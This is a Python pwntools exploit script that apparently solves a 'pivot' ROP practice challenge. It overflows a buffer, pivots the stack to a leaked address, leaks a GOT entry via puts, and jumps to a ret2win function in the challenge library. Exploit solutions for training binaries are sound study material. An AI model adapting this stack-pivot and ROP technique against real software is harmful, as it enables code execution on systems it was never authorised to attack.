#!/usr/bin/env python
from pwn import * 
import struct
import binascii

bin_name = './pivot'

# RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
# Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH  74) Symbols	  No	0		3		pivot

pop_rax         = 0x4009bb # pop rax; ret;
xchg_rax_rsp    = 0x4009bd # xchg rax, rsp; ret;
foothold_gotplt = 0x601040 # foothold_function@got.plt
foothold_plt    = 0x400720 # foothold_function@plt
pop_rdi         = 0x400a33 # pop rdi; ret;
puts            = 0x4006e0 # puts@plt
pwnme           = 0x4008f1 # sym.pwnme

context.clear(arch='amd64')
context.log_level = 'debug'

proc = process(bin_name)

proc.recvuntil('pivot: ')
pivot_addr = int(proc.recvline().strip()[2:], 16)

padding_len = 40

rop_chain  = p64(foothold_plt)
rop_chain += p64(pop_rdi)
rop_chain += p64(foothold_gotplt)
rop_chain += p64(puts)
rop_chain += p64(pwnme)

smash  = padding_len * b'A'
smash += p64(pop_rax)
smash += p64(pivot_addr)
smash += p64(xchg_rax_rsp)

proc.sendline(rop_chain)
proc.sendline(smash)

proc.recvuntil("into libpivot\n")
libpivot_foothold = proc.recvline().strip()
libpivot_ret2win = int.from_bytes(libpivot_foothold, "little") + 279

# ### STAGE 2 ### #

smash = padding_len * b'A'
smash += p64(libpivot_ret2win)

proc.sendline(smash)

print(proc.recvall().decode('ascii'))
